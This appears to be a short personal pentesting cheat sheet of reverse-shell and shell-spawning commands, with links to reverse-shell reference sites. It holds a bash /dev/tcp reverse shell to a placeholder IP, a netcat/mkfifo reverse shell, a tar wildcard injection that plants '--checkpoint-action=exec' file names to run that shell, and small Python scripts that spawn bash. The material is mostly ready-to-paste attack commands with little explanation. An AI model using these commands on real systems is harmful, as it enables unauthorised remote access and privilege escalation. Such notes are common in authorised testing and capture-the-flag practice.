# Resources
- http://www.revshells.com
- https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux

---
# Shellnanigans

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `bash -i >& /dev/tcp/<IP>/<port> 0>&1`

Tar being called with wildcard `*` [HelpNetSecurity](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com) explanation
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

---

# Scripts
## Python3
```python
import subprocess

def spawn_bash():
    # Spawns an interactive Bash shell
    subprocess.run("/bin/bash")

if __name__ == "__main__":
    spawn_bash()

```

## Python2
```python
import subprocess

def spawn_bash():
    # Spawns an interactive Bash shell
    subprocess.call("/bin/bash")

if __name__ == "__main__":
    spawn_bash()

```

## BASH
```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<port> 0>&1
```
